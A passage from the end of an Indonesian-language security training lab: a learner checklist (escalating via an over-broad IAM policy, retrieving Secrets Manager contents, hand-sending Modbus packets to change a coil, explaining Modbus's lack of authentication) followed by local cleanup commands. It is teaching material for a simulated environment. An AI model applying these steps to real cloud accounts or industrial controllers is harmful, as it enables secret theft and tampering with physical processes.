- [ ] Saya membaca policy IAM dan bisa menjelaskan kenapa dia setara administrator
- [ ] Saya mengambil isi Secrets Manager
- [ ] Saya mengirim satu paket Modbus dengan tangan dan bisa membaca tiap bytenya
- [ ] Saya MENGUBAH keadaan coil dan membuktikannya dengan pembacaan ulang
- [ ] Saya bisa menjelaskan kenapa Modbus tidak punya autentikasi, dan mitigasinya
- [ ] Saya tahu mana bagian lab ini yang TIDAK berlaku di AWS sungguhan

## Membereskan

```
./lab down 08          # macOS, Linux
.\lab.cmd down 08      # Windows
```

Perintah itu menghapus container beserta volume-nya, jadi seluruh akun palsu dan
semua perubahan register Anda ikut hilang. Kalau Anda cuma mau mengulang dari
keadaan bersih tanpa keluar dari lab:

```
./lab reset 08
```

Ingat bahwa reset membuat kunci akses baru, jadi nilai yang Anda catat di
langkah 4 tidak berlaku lagi setelahnya.

Lab ini memakai 1.74 GB disk untuk image LocalStack dan 98 MB untuk
server Modbus, diukur dengan `docker images` pada 2026-08-06. Kalau laptop Anda sempit setelah kelas selesai, dua image itu
bisa dihapus dengan `docker rmi localstack/localstack:4.9 oitc/modbus-server:2.3.0`.
